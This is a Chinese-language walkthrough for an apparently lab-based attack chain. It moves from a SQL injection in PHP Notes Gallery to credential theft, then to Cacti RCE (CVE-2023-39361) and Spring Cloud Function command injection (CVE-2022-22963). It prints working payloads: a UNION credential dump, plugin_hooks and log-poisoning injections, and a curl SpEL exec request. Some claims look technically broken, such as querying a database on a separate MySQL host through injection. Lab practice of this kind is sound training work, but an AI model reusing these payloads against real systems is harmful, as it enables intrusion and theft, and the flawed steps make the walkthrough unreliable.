# 渗透链解决方案：CVE-2023-7130 -> CVE-2023-39361 -> CVE-2022-22963

本解决方案描述了如何利用 CVE-2023-7130（SQL 注入）漏洞获取 CVE-2023-39361 (Cacti) 的登录凭证，进而利用 CVE-2023-39361 (SQL 注入导致 RCE) 漏洞获得远程代码执行，最终在内网中访问并利用 CVE-2022-22963（Spring Cloud Function 命令注入）漏洞。

## 拓扑结构

- `frontend_network` (172.30.0.0/16): 外部可访问网络
    - CVE-2023-7130 (SQLi): Web 服务 (172.30.0.2:9000)
    - CVE-2023-7130-db (MySQL 5.7): 数据库 (172.30.0.11)
    - CVE-2023-39361 (SQLi+RCE): Web 服务 (172.30.0.3:9001)
    - CVE-2023-39361-db (MySQL 5.7): 数据库 (172.30.0.10)
- `internal_network` (172.31.0.0/16): 内部网络
    - CVE-2023-39361 (SQLi+RCE): Web 服务 (172.31.0.2)
    - CVE-2023-39361-db (MySQL 5.7): 数据库 (172.31.0.10)
    - CVE-2022-22963: Spring Cloud Function (172.31.0.3)

## 攻击步骤

### 步骤 1: 通过 CVE-2023-7130 (SQLi) 获取 CVE-2023-39361 (Cacti) 凭证

CVE-2023-7130 是一个 PHP Notes Gallery 应用，存在 SQL 注入漏洞。尽管 `readme.txt` 文件提供了默认凭证 `admin/123456` 用于其自身登录，但我们需要利用其 SQL 注入能力来窃取 CVE-2023-39361 (Cacti) 的登录凭证。

由于 CVE-2023-7130 的 Web 服务 (`172.30.0.2`) 和 CVE-2023-39361 的数据库 (`172.30.0.10`) 都位于 `frontend_network` 上，理论上 CVE-2023-7130 上的 SQL 注入可以跨库查询 `cve-2023-39361-db` 中的数据。

1.  **确定 SQL 注入点**:
    访问 CVE-2023-7130 应用程序 (http://your-ip:9000)。通过测试输入参数（例如在 GET 或 POST 请求参数中插入 `'` 或 `"`），识别存在的 SQL 注入点。常见的注入点可能存在于搜索功能、用户登录或任何数据查询操作中。

2.  **利用 SQL 注入窃取 Cacti 凭证**:
    一旦找到 SQL 注入点，可以使用 Union Based 或 Error Based SQL 注入技术，从 `cve-2023-39361-db` 中提取 Cacti 数据库 `cacti` 中的 `user_auth` 表中的用户名和密码。Cacti 的默认管理员凭证通常是 `admin/admin`。

    **示例 SQL 注入Payload (假设存在 UNION 注入点，并且目标数据库为 `cacti`，且存在 `user_auth` 表):**

    ```
    ' UNION SELECT 1,2,concat(id,0x23,username,0x23,password) FROM cacti.user_auth -- -
    ```
    将其插入到你发现的 SQL 注入参数中。例如，如果 `id` 参数存在漏洞，则请求可能类似于：
    `http://your-ip:9000/vulnerable_page.php?id=1' UNION SELECT 1,2,concat(id,0x23,username,0x23,password) FROM cacti.user_auth -- -`

    通过此注入，你将能够获取到 Cacti 的管理员用户名和密码，例如 `admin/admin`。

### 步骤 2: 在 CVE-2023-39361 (Cacti) 上实现远程代码执行 (RCE)

获取到 Cacti 的管理员凭证后，我们可以利用 CVE-2023-39361 漏洞，这是一个在 `graph_view.php` 中存在的 SQL 注入漏洞，可以导致 RCE。

1.  **登录 Cacti**:
    访问 Cacti Web 界面 (http://your-ip:9001)，使用在步骤 1 中获取到的 Cacti 管理员凭证登录（通常是 `admin/admin`）。

2.  **启用访客访问 (如果需要)**:
    根据 CVE-2023-39361 的 `README.md`，如果你希望在未认证的情况下利用此漏洞，需要登录 Cacti 后导航至 `Configuration -> Authentication`，并启用访客用户。

3.  **利用 `graph_view.php` SQL 注入获取 RCE**:
    该漏洞存在于 `graph_view.php` 的 `rfilter` 参数中。利用堆叠查询，我们可以写入 PHP 代码到日志文件，然后通过插件机制执行。

    **Payloads:**

    *   **注入插件钩子，指向 `log/cacti.log`**:
        将以下 payload 插入到 `rfilter` 参数中，例如访问 `http://your-ip:9001/graph_view.php`。

        ```
        action=tree_content&node=1-1-tree_anchor&rfilter=aaaaa" OR ""=((""));INSERT INTO plugin_hooks(name,hook,file,status) VALUES (".","login_before","../log/cacti.log",1);#
        ```

    *   **写入 PHP 代码到 `log/cacti.log`**:
        接下来，使用以下 payload 将 PHP 代码写入 `log/cacti.log`。这里的例子是 `phpinfo()`，你可以替换为任何你想要的 PHP 代码（例如，一个反向 shell）。

        ```
        action=tree_content&node=1-1-tree_anchor&rfilter=aaaaa" OR ""=(("")) UNION SELECT 1,2,3,4,5,6,updatexml(rand(),concat(0x7e,"<?php phpinfo();?>",0x7e),null),8,9,10#
        ```

    *   **触发 RCE**:
        访问 Cacti 的登录页面 (http://your-ip:9001/index.php)。此时，写入到 `log/cacti.log` 的 PHP 代码（例如 `phpinfo()`）将会执行，确认 RCE 成功。

### 步骤 3: 访问内网中的 CVE-2022-22963

一旦在 CVE-2023-39361 容器中获得了 RCE，我们就可以利用这个立足点来访问 `internal_network` 中的 CVE-2022-22963 服务。CVE-2022-22963 是一个 Spring Cloud Function 命令注入漏洞。

1.  **在 CVE-2023-39361 容器中执行命令**:
    通过 RCE，你可以在 `cve-2023-39361` 容器内部执行系统命令。你可以使用 `curl` 或其他网络工具来与内网中的服务进行交互。

2.  **利用 CVE-2022-22963 命令注入**:
    CVE-2022-22963 服务位于内网 IP `172.31.0.3` 的 `8080` 端口。利用其命令注入漏洞，可以通过发送恶意请求执行命令。

    **示例 `curl` 命令（从 `cve-2023-39361` 容器内部执行）**:
    要从 `cve-2023-39361` 容器内访问 `cve-2022-22963`，你可以使用以下 `curl` 命令（假设攻击者想要执行 `id` 命令）：

    ```bash
    curl -X POST -H "Content-Type: text/plain" -H "spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec('id')" http://172.31.0.3:8080/functionRouter
    ```

    此命令会触发 CVE-2022-22963 上的命令执行，并将 `id` 命令的输出返回给你。你可以替换 `id` 为任何你希望在 `cve-2022-22963` 容器中执行的命令。

通过以上步骤，你将能够完成从 CVE-2023-7130 到 CVE-2022-22963 的整个渗透链。 